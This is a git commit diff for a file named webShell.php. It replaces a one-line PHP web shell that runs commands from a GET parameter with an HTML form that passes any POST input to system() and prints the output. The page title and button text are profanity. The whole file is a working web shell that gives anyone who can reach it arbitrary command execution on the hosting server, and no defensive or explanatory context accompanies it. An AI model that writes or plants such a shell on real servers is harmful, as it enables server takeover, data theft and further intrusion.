ad6e598e58ed60a9e06ff51b8f691d797100f205
KyeongseoJoo <a87330514@gmail.com>
2026-03-23 17:09:31 +0900

    Implement command execution form in webShell.php
    Added HTML form to execute system commands via POST.

--- webShell.php
+++ webShell.php
@@ -1,1 +1,21 @@
-<?php system($_GET['cmd']); ?>
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>fuck</title>
+</head>
+<body>
+    <form method="POST" action="">
+        <input type="text" name="cmd">
+        <button type="submit">fuck</button>
+    </form>
+    <pre>
+        <?php
+        if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
+            $cmd = $_POST['cmd'];
+            system($cmd);
+        }
+        ?>
+    </pre>
+</body>
+</html>
